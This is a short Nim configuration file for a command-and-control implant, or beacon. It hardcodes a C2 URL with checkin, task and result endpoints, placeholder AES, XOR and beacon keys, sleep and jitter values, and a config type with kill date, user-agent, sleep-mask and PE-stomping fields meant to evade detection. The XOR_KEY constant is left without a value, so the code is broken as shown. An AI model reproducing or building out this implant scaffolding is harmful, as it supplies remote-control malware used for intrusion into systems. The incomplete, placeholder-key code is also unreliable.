const
    IMPLANT_VERSION* = "0.0.1" 
    C2_URL* = "http://127.0.0.1:8080"
    CHECKIN_URI* = "/checkin"
    TASK_URI* = "/task"
    RESULT_URI* = "/result"
    IMPLANT_COUNT* = 0

    #CRYPTO
    PER_BEACON_KEY* = "9284174818712"
    AES_KEY* = "1234567890123456"  # store the keys in hex
    AES_NONCE* = "12345678" 
    XOR_KEY* = 

    SLEEP_MIN* = 3
    SLEEP_MAX* = 8

type BeaconConfig* = object
    beaconID*: string
    profileID*: string
    c2Urls*: seq[string]
    currentDomainIndex*: int
    sleepTime*: int
    jitter*: int
    encryptionKey*: seq[byte]
    killDate*: DateTime
    lastCheckin*: DateTime
    userAgent*: string
    sleepMask*: bool
    stomppe*: bool